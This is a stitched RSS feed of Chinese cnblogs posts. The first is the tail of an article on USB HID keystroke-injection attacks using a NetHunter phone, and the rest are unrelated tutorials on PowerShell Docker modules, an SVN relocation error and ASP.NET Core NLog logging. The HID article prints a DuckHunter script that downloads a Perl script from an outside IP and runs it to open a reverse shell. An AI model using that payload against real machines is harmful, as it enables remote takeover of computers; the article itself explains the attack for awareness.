&lt;p&gt;如果手机没电了，那么旁边如果其他人正好有电脑，借用其他人电脑的USB口给手机充电是一件很常见的事，但其实，只是插个数据线，也可以导致电脑被攻击，下面视频演示的是一部手机通过USB连接MAC电脑执行指定的命令（视频里是ifconfig）。&lt;/p&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot;&gt; https://v.qq.com/x/page/q03959yfsxh.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;视频里的手机是一个很普通的手机，安装了一个叫做&quot;Nethunter&quot;的黑客操作系统，也就成为&quot;黑客手机&quot;,里面集成了一些黑客攻击工具，比如视频里演示的工具叫做DuckHunter HID。看到这个视频，大家是否会觉得这个攻击挺高端的，物理黑客攻击，但当我告诉大家原理之后，大家可能想到的就是&quot;原来如此，这么简单&quot;。&lt;/p&gt;
&lt;p&gt;手机上显示的代码是：&lt;/p&gt;
&lt;pre class=&quot;prism-token token language-javascript&quot;&gt;
CONTROL SPACE
STRING iterm
ENTERENTER
STRING
ifconfig
ENTER
&lt;/pre&gt;
&lt;p&gt;看完这个代码不知道大家是否已经明白了攻击原理，熟悉MAC操作的同学可能知道CONTROL+SPACE其实是调起Spotlight，一个类似快捷启动的工具，然后输入iterm，就是查找iTerm，然后回车，打开iTerm后，再输入ifconfig，再回车，就完成了整个命令输入执行的过程；大家可以发现，这其实就是一个模拟键盘操作的过程，没错，上面视频演示的攻击原理就是模拟键盘操作，其实这时候的手机用USB接入电脑相其实就是把自己设置为键盘接入电脑，然后再直接模拟键盘操作进行攻击。&lt;/p&gt;
&lt;p&gt;那么是否可以进行危害更大的攻击？比如反弹Shell？当然可以，改下代码即可：&lt;/p&gt;
&lt;pre class=&quot;prism-token token language-javascript&quot;&gt;
CONTROL SPACE
STRING iterm 
ENTERENTER
STRING wget http&lt;span class=&quot;token punctuation&quot;&gt;:&lt;span class=&quot;token operator&quot;&gt;/&lt;span class=&quot;token operator&quot;&gt;/&lt;span class=&quot;token number&quot;&gt;45.32&lt;span class=&quot;token punctuation&quot;&gt;.&lt;span class=&quot;token number&quot;&gt;8.108&lt;span class=&quot;token operator&quot;&gt;/b&lt;span class=&quot;token punctuation&quot;&gt;.pl&lt;span class=&quot;token punctuation&quot;&gt;.txt &lt;span class=&quot;token operator&quot;&gt;-O &lt;span class=&quot;token operator&quot;&gt;/tmp&lt;span class=&quot;token operator&quot;&gt;/b&lt;span class=&quot;token punctuation&quot;&gt;.plSTRING perl &lt;span class=&quot;token operator&quot;&gt;/tmp&lt;span class=&quot;token operator&quot;&gt;/b&lt;span class=&quot;token punctuation&quot;&gt;.pl 
反弹监听IP 监听端口
ENTER&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;采用下载一个Perl脚本来实现反弹Shell，如下面视频：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v.qq.com/x/page/f0395v8ez5e.html&quot; target=&quot;_blank&quot;&gt; https://v.qq.com/x/page/f0395v8ez5e.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;讲这个例子的目的其实就是这部分的标题，功能也是攻击方式。在黑客的眼里，不是一定得使用漏洞，使用多高端的技巧，能达到攻击目的和效果的方式都是好的攻击方式，这些方式不局限于大家所了解的只是漏洞或者暴力破解等，而经常做的就是利用正常的功能来实现攻击，这种攻击因为使用的是常的功能，有时候反而更隐蔽；而类似的攻击方式，不在少数。&lt;/p&gt;
&lt;h2&gt;结语&lt;/h2&gt;
&lt;p&gt;其实，近几年来，大家对黑客的了解已经越来越多，黑客也越来越失去神秘，然后大家就会发现，他们其实也是生活中的普通人；而在黑夜中工作，有时更多的是因为那时候安静，做事效率高，或者是管理员不在线好做一些秘密的攻击和测试等，而不是所谓各种描述里的戴着衣帽，把自己包裹在黑暗中，不露出自己的真面目等。&lt;/p&gt;
&lt;p&gt;其实黑客所不同于普通人的点，除了掌握的知识外，就是做事和思考的方式，仅此而已！&lt;/p&gt;

&lt;blockquote readability=&quot;1.0952380952381&quot;&gt;
&lt;h2&gt;&lt;strong&gt;问答&lt;/strong&gt;&lt;/h2&gt;
&lt;p class=&quot;ask-title&quot;&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/ask/69935&quot; target=&quot;_blank&quot;&gt;什么是memcache漏洞？它又有什么样的影响？&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;相关阅读&lt;/h2&gt;
&lt;p class=&quot;col-article-title&quot;&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1005624&quot; target=&quot;_blank&quot;&gt;【读家】专访Killer：计算机病毒大多没有技术含量&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;col-article-title&quot;&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1072369&quot; target=&quot;_blank&quot;&gt;如何确保NFS服务安全&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;col-article-title&quot;&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1020483&quot; target=&quot;_blank&quot;&gt;【黑客解析】黑客是如何实现数据库勒索的 ?&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;&lt;span data-sheets-value=&quot;{&amp;quot;1&amp;quot;:2,&amp;quot;2&amp;quot;:&amp;quot;Unity引擎与C#脚本简介&amp;quot;}&quot; data-sheets-userformat=&quot;{&amp;quot;2&amp;quot;:1,&amp;quot;3&amp;quot;:[null,0]}&quot;&gt;此文已由作者授权腾讯云+社区发布，转载请注明&lt;a href=&quot;https://cloud.tencent.com/developer/article/1020492&quot; target=&quot;_blank&quot;&gt;文章出处&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原文链接：https://cloud.tencent.com/developer/article/1020492&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112679/201803/1112679-20180326152453442-656375349.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 26 Mar 2018 07:28:00 +0000</pubDate>
<dc:creator>腾讯云+社区</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qcloud1001/p/8651368.html</dc:identifier>
</item>
<item>
<title>巧用linux版powershell，管理linux下的docker - PowerShell免费软件</title>
<link>http://www.cnblogs.com/piapia/p/8651332.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/piapia/p/8651332.html</guid>
<description>&lt;p&gt;大家好，我把用powershell的docker马甲命令的好处，放在了页面下方，从第五章开始。&lt;br/&gt; &lt;br/&gt;powershell 传教士 原创文章 始于 2017-09-07 允许转载，但必须保留名字和出处，否则追究法律责任&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;powershell,docker,cli,命令,docker ps,docker image&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;目的：&lt;br/&gt;在任意版本的linux（物理机，虚拟机，节点机）中，安装docker服务。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;动作：&lt;br/&gt;教程=略，不是本文主要目的。请参考官网。&lt;/p&gt;
&lt;p&gt;ubuntu&lt;br/&gt;https://docs.docker.com/install/linux/docker-ce/ubuntu/&lt;/p&gt;
&lt;p&gt;centos&lt;br/&gt;https://docs.docker.com/install/linux/docker-ce/centos/&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;目的：&lt;br/&gt;在linux发行版上，安装powershell。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;动作：&lt;br/&gt;教程=略，不是本文主要目的。请参考官网。&lt;br/&gt;https://github.com/PowerShell/PowerShell/blob/master/docs/installation/linux.md&lt;/p&gt;
&lt;p&gt;系统需求：&lt;br/&gt;问：目前哪些版本linux能安装上powershell？&lt;br/&gt;答：&lt;br/&gt;◦Windows 10 IoT Core(arm32的cpu，本质上是win，树莓派硬件上的win10)&lt;br/&gt;◦Raspbian Stretch(arm32的cpu，树莓派官方操作系统Raspbian，基于大便，所以叫树莓便。）&lt;br/&gt;◦MAC OS X 10.11&lt;br/&gt;◦Ubuntu 14.04/16.04/17.10&lt;br/&gt;◦Debian8.x/9.x&lt;br/&gt;◦CentOS 7.x/RHEL 7.x/Fedora25/Fedora26/Fedora27&lt;br/&gt;◦open SUSE 42及以上/SUSE Linux Enterprise Server 12 SP2&lt;br/&gt;◦Docker。LINUX发行版中，安装容器dockerd，docker中运行powershell。&lt;br/&gt;◦Arch Linux （archl inux 没有版本号）&lt;br/&gt;◦Linux AppImage 容器(portable application single binary)  https://github.com/probonopd/AppImageKit&lt;br/&gt;◦Kali Linux&lt;/p&gt;


&lt;p&gt;&lt;br/&gt;目的：&lt;br/&gt;升级powershell的psreadline模块。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;动作：&lt;br/&gt;1 请把终端软件的键盘，的BACKSPACE，设置成 ascii127(ctrl + ?)&lt;br/&gt;2 pwsh&lt;br/&gt;3 Install-Module -Name PSReadLine -AllowPrerelease -Force -SkipPublisherCheck&lt;/p&gt;


&lt;p&gt;&lt;br/&gt;目的：&lt;br/&gt;给linux版powershell，安装docker模块。完成后，就有了马甲docker命令。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;官网在：&lt;br/&gt;https://github.com/Microsoft/Docker-PowerShell/&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;动作：&lt;br/&gt;pwsh&lt;br/&gt;Register-PSRepository -Name DockerPS-Dev -SourceLocation https://ci.appveyor.com/nuget/docker-powershell-dev&lt;br/&gt;Install-Module Docker -Repository DockerPS-Dev&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;查看有哪些马甲docker命令：&lt;br/&gt;get-command -module docker&lt;/p&gt;
&lt;p&gt;CommandType     Name                                               Version    Source     &lt;br/&gt;-------------------------------------------------------------------------------------&lt;br/&gt;Alias           Attach-Container                                   0.1.0.111  Docker                                                             &lt;br/&gt;Alias           Build-ContainerImage                               0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Commit-Container                                   0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Exec-Container                                     0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Load-ContainerImage                                0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Pull-ContainerImage                                0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Push-ContainerImage                                0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Run-ContainerImage                                 0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Save-ContainerImage                                0.1.0.111  Docker                                                            &lt;br/&gt;Alias           Tag-ContainerImage                                 0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Add-ContainerImageTag                              0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          ConvertTo-ContainerImage                           0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Copy-ContainerFile                                 0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Enter-ContainerSession                             0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Export-ContainerImage                              0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Get-Container                                      0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Get-ContainerDetail                                0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Get-ContainerImage                                 0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Get-ContainerNet                                   0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Get-ContainerNetDetail                             0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Import-ContainerImage                              0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Invoke-ContainerImage                              0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          New-Container                                      0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          New-ContainerImage                                 0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          New-ContainerNet                                   0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Remove-Container                                   0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Remove-ContainerImage                              0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Remove-ContainerNet                                0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Request-ContainerImage                             0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Start-Container                                    0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Start-ContainerProcess                             0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Stop-Container                                     0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Submit-ContainerImage                              0.1.0.111  Docker                                                            &lt;br/&gt;Cmdlet          Wait-Container                                     0.1.0.111  Docker                                                            &lt;/p&gt;

&lt;p&gt;其中：&lt;br/&gt;Request-ContainerImage===Request-ContainerImage&lt;br/&gt;Start-ContainerProcess===Exec-Container&lt;br/&gt;Invoke-ContainerImage===Run-ContainerImage&lt;br/&gt;Enter-ContainerSession===Attach-Container&lt;br/&gt;Export-ContainerImage===Save-ContainerImage&lt;/p&gt;

&lt;p&gt;简单使用：&lt;br/&gt;Import-Module Docker&lt;br/&gt;&lt;span&gt;Get-Container  #这个命令就是 docker ps的马甲&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;目的1：&lt;br/&gt;使用镜像名，或镜像名内包含的【字符串】来匹配容器，&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;动作1：&lt;br/&gt;Get-Container | Where-Object {$_.Image -eq 'nginx'} |Stop-Container  #Get-Container相当于docker ps&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;讲解：&lt;br/&gt;Get-Container，相当于docker ps。但是Get-Container返回的是对象。&lt;/p&gt;
&lt;p&gt;【|】是管道。powershell的管道，是世界上唯一可以传输对象的。&lt;/p&gt;
&lt;p&gt;Where-Object {} 是过滤语法。&lt;/p&gt;
&lt;p&gt;$_.Image 是镜像名属性，其他属性是&lt;br/&gt;$_.ID     字符串&lt;br/&gt;$_.Command  字符串&lt;br/&gt;$_.Created  日期型&lt;br/&gt;$_.Status   字符串                &lt;br/&gt;$_.Names   字符串&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;-eq是表达式。可以有如下表达式：&lt;br/&gt;$_.Image -eq '字符串' #不区分大小写相等。 'abc' -eq 'Abc'&lt;br/&gt;$_.Image -match '字符串' #正则匹配。 'abc' -match '^a.c$'&lt;br/&gt;$_.Image -like '*字符串*' # 'abc' -like '*bc*'&lt;br/&gt;$_.数值型 -gt 123 # 456 -gt 123&lt;/p&gt;
&lt;p&gt;$a = [datetime]'2018-03-17'&lt;br/&gt;$_.日期型 -gt $a #&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;|Stop-Container，过滤完成后，输出一个或n个对象，然后用Stop-Container停止它。&lt;/p&gt;
&lt;p&gt;------------------------------------------------------------&lt;br/&gt;目的2：&lt;br/&gt;powershell命令行中，tab自动补全，（容器命令相关的）参数名，参数值&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;动作2-1：&lt;br/&gt;Get-Container -c，然后打tab，&lt;/p&gt;
&lt;p&gt;结果2-1：&lt;br/&gt;命令行出现：&lt;br/&gt;Get-Container -ContainerIdOrName&lt;/p&gt;
&lt;p&gt;-----------------&lt;br/&gt;动作2-2：&lt;br/&gt;Get-Container -ContainerIdOrName，然后打空格，然后依次打n次tab。&lt;/p&gt;
&lt;p&gt;结果2-2：&lt;br/&gt;命令行出现：&lt;br/&gt;Get-Container -ContainerIdOrName 【docker ps 中列出的容器名】&lt;br/&gt;依次打n次shift + tab则从后向前，列出容器名&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;-----------------&lt;br/&gt;动作2-3：&lt;br/&gt;Get-ContainerImage  -，然后打tab。Get-ContainerImage相当于docker image ls&lt;br/&gt; &lt;/p&gt;
&lt;p&gt;结果2-3：&lt;br/&gt;命令行出现：&lt;br/&gt;Get-ContainerImage -ImageIdOrName&lt;br/&gt;再打空格，再打tab 出现【docker image ls 中列出的容器名】&lt;/p&gt;
&lt;p&gt;------------------------------------------------------------&lt;br/&gt;场景：&lt;br/&gt;同一个镜像，我运行了很多个，&lt;/p&gt;

&lt;p&gt;ID                   Image           Command              Created                Status               Names              &lt;br/&gt;--                   -----           -------              -------                ------               -----              &lt;br/&gt;034c78b5e4e18b772... hello-world     /hello               18-3-19 下午5:20:03      Exited (0) 12 min... ecstatic_khorana   &lt;br/&gt;8ced2c429e5ba0790... hello-world     /hello               18-3-17 下午9:05:00      Exited (0) 44 hou... objective_villani  &lt;br/&gt;18cc9a6e1ea14ae8d... hello-world     /hello               18-3-9 下午5:03:08       Exited (0) 10 day... priceless_ardingh...&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;目的3-1：&lt;br/&gt;编写脚本，匹配镜像名，状态码&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;powershell脚本代码3-1：&lt;br/&gt;$状态码字串1 = Get-Container | Where-Object {$_.Image -eq 'hello-world'} | Select-Object Status &lt;br/&gt;#$状态码&lt;br/&gt;#Exited (143) 24 hours ago&lt;br/&gt;if ($状态码字串1 -like '*Exited (0)*')&lt;br/&gt;{echo  '正常'}&lt;br/&gt;else&lt;br/&gt;{这里做点什么}&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;-----------------&lt;br/&gt;目的3-2：&lt;br/&gt;1匹配镜像名。&lt;br/&gt;2排序，并输出&lt;br/&gt;3取状态码&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;powershell脚本代码3-2：&lt;br/&gt;$状态码字串2 = Get-Container | Where-Object {$_.Image -eq 'hello-world'} |Sort-Object -Property Created |Select-Object Status -Last 1&lt;br/&gt;$状态码 = $状态码字串2.status.split('(')[1].split(')')[0]&lt;/p&gt;

&lt;p&gt;------------------------------------------------------------&lt;br/&gt;docker ps命令有输出对不齐的烦恼，实际上所有linux命令都有输出对不齐的情况，而powershell永远没有这种情况。&lt;/p&gt;
&lt;p&gt;目的4：&lt;br/&gt;只输出docker ps的，names   command&lt;/p&gt;
&lt;p&gt;动作4：&lt;br/&gt;Get-Container |Select-Object names,command&lt;br/&gt;#或Get-Container |Select-Object names,image&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;输出：&lt;br/&gt;Names                           Command            &lt;br/&gt;-----                           -------            &lt;br/&gt;{/priceless_ardinghelli}        /hello             &lt;br/&gt;{/zabbix}                       /config/bootstrap.sh&lt;br/&gt;{/zabbix-db, /zabbix/zabbix.db} /run.sh            &lt;br/&gt;{/zabbix-db-storage}            sh                 &lt;br/&gt;{/pedantic_bose}                /hello             &lt;/p&gt;

&lt;p&gt;&lt;br/&gt;powershell的马甲版docker命令，比docker原生命令，有如下优点：&lt;br/&gt;1 输出的显示数据，永远没有对不齐的问题。&lt;br/&gt;2 powershell马甲版docker命令，是面向对象的。通过属性匹配docker的名字和参数，表达式支持正则，更强大。比用grep简单，严谨。&lt;br/&gt;3 powershell的管道，支持对象。用起来强大简单。&lt;br/&gt;4 powershell马甲版docker命令的，参数名，参数值，支持tab自动补全，用起来十分方便。&lt;br/&gt;5 ps的马甲命令Get-Container，相当于docker ps。&lt;br/&gt;它的输出，分行，分列。如下：用起来比docker ps输出的字符串要好。&lt;/p&gt;
&lt;p&gt;ID  Image  Command  Created  Status  Names              &lt;br/&gt;--    -----      -------          ------        ------     -----&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;需要说明的是，这些优点，本质上和docker命令无关。这是powershell命令行，比linux命令行的优点。&lt;/p&gt;

&lt;p&gt;从前，有一头“青翼蝠王”韦瞎笑，在z呼发贴说：“管道中传对象，是没必要的”。是这样么？&lt;br/&gt;我的这篇帖子，很好地说明了这一点。&lt;br/&gt;-----------------------------谢谢看贴，完。-------------------------------&lt;/p&gt;

</description>
<pubDate>Mon, 26 Mar 2018 07:24:00 +0000</pubDate>
<dc:creator>PowerShell免费软件</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/piapia/p/8651332.html</dc:identifier>
</item>
<item>
<title>SVN报E155024: Invalid relocation destination - 白壮丽</title>
<link>http://www.cnblogs.com/china-baizhuangli/p/8651222.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/china-baizhuangli/p/8651222.html</guid>
<description>&lt;p&gt;大家开发过程会遇到一个场景！&lt;/p&gt;
&lt;p&gt;我们在使用SVN版本管理工具进行开发的过程中，前一个版本在Branch—&amp;gt;201803 分支开发完成之后，后一版本要求在Branch—&amp;gt;201804版本开发&lt;/p&gt;
&lt;p&gt;那我们就需要切换一个本地已经开发好的项目资源路径了。&lt;/p&gt;
&lt;p&gt;1、如何切换？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1357524/201803/1357524-20180326150347842-1817445384.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;2、选择切换资源路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1357524/201803/1357524-20180326150410302-508527411.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;3、biu 如你所愿报错！SVN报E155024: Invalid relocation destination&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1357524/201803/1357524-20180326150449695-790579787.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;4、为什么出现这个问题？为啥会有出现呢？&lt;/p&gt;
&lt;p&gt;翻译过来：e155024：无效的迁移资源目录&lt;/p&gt;
&lt;p&gt;　　原因如下：没有找到对应的资源路径，可能是因为开发工具在完成检出之后，后期就不会再从当前项目的相对位置出发重新定位在SVN的绝对路径，所以也就不能够识别你SVN上的新路径。&lt;/p&gt;
&lt;p&gt;5、如何解决？&lt;/p&gt;
&lt;p&gt;既然插件不能解决，那我们就用SVN的命令来试一下。SVN SW 就是切换路径的。但是需要注意的是！&lt;/p&gt;
&lt;p&gt;（1）首先定位到我们想要切换的项目所在的本地路径（cd  ／XX／XX）&lt;/p&gt;
&lt;p&gt;（2）在本地项目所在目录进行svn switch 新分支路径&lt;/p&gt;
&lt;p&gt;具体举例如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1357524/201803/1357524-20180326151109506-375094721.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt;　　小白看问题，浅显不深究&lt;/p&gt;
&lt;p&gt;如若表达不清晰或存疑，可留言指教！&lt;/p&gt;
&lt;p&gt;　　　　　　感谢来过&lt;/p&gt;
&lt;p&gt;　　放松一下啦，找找下图几个方脸吧！&lt;/p&gt;
&lt;p&gt;————————————————————————————————————————————————&lt;/p&gt;
&lt;p&gt;　　　　　　（^ _ ^）  （^ _ ^）（^ _ ^）（^ _ ^）（^ _ ^）（^ _ ^)&lt;/p&gt;
&lt;p&gt;　　　　　　　（^ _ ^）[^ _ ^]（^ _ ^）（^ _ ^）[^ _ ^]（^ _ ^）&lt;/p&gt;
&lt;p&gt;　　　　　　　　（^ _ ^）（^ _ ^）（^ _ ^）（^ _ ^）（^ _ ^）&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　（^ _ ^）[^ _ ^]（^ _ ^）（^ _ ^）&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　（^ _ ^）（^ _ ^）（^ _ ^）&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　　（^ _ ^）[^ _ ^]&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　　　   （^ _ ^）&lt;/p&gt;
&lt;p&gt;————————————————————————————————————————————————&lt;/p&gt;
</description>
<pubDate>Mon, 26 Mar 2018 07:15:00 +0000</pubDate>
<dc:creator>白壮丽</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/china-baizhuangli/p/8651222.html</dc:identifier>
</item>
<item>
<title>Asp.Net Core 2.0 项目实战（9） 日志记录，基于Nlog或Microsoft.Extensions.Logging的实现及调用实例 - 郑州-在路上</title>
<link>http://www.cnblogs.com/oorz/p/8651049.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/oorz/p/8651049.html</guid>
<description>&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;strong&gt;本文目录&lt;br/&gt;1. Net下日志记录&lt;br/&gt;2. NLog的使用&lt;br/&gt;    2.1 添加nuget引用NLog.Web.AspNetCore&lt;br/&gt;    2.2 配置文件设置&lt;br/&gt;    2.3 依赖配置及调用&lt;br/&gt;    2.4 日志类型介绍&lt;br/&gt;    2.5 产生的日志文件&lt;br/&gt;3. 基于Microsoft.Extensions.Logging封装&lt;br/&gt;    3.1 添加引用Microsoft.Extensions.Logging&lt;br/&gt;    3.2 实现我们的Logger&lt;br/&gt;    3.3 调用WLogger&lt;br/&gt;4. 总结&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;1.  Net下日志记录&lt;/h2&gt;
&lt;p&gt;　　Net Freamwork框架下在日志记录框架有很多，常见的有NLog、Log4Net、Loggr和内置 Microsoft.Diagnostics.Trace/Debug/TraceSource等。Asp.Net Core 2.0下大部分框架已不支持,Microsoft提供Microsoft.Extensions.Logging供大家实现自己的记录日志框架。现在笔者了解到的NLog已支持Net Core,下面我们介绍下nlog在项目中的使用以及基于Microsoft.Extensions.Logging封装自己的日志记录类。&lt;/p&gt;
&lt;h2&gt;1.  NLog的使用&lt;/h2&gt;
&lt;h3&gt;　　2.1添加nuget引用NLog.Web.AspNetCore&lt;/h3&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326145742050-734910279.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;　　2.2配置文件设置&lt;/h3&gt;
&lt;p&gt;　　　　在Asp.Net Core 2.0项目实战项目中，我们把配置文件统一放在configs文件夹中，方便管理。读取时用Path.Combine(&quot;configs&quot;, &quot;nlog.config&quot;)即可。下面是nlog.config的配置。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_0a0783c8-3317-4996-b1d4-daf380951eef&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_0a0783c8-3317-4996-b1d4-daf380951eef&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_0a0783c8-3317-4996-b1d4-daf380951eef&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&amp;lt;?xml version=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; encoding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ?&amp;gt;
&amp;lt;nlog xmlns=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://www.nlog-project.org/schemas/NLog.xsd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
      xmlns:xsi&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://www.w3.org/2001/XMLSchema-instance&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
      autoReload&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
      internalLogLevel&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
      internalLogFile&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;internal-nlog.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;

  &amp;lt;!--define various log targets--&amp;gt;
  &amp;lt;targets&amp;gt;
    &amp;lt;!--write logs to file--&amp;gt;
    &amp;lt;target xsi:type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;File&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;allfile&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; fileName=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nlog-all-${shortdate}.log&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                 layout&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${longdate}|${logger}|${uppercase:${level}}|${message} ${exception}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
